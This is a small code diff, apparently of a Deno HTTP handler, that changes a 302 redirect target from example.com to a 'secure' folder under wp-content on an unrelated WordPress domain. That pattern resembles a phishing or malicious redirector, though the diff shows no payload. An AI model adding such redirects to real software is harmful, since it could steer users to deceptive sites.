@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://example.com",
+      Location: "https://waroeng88.org/wp-content/secure/",
     },
   });
 });
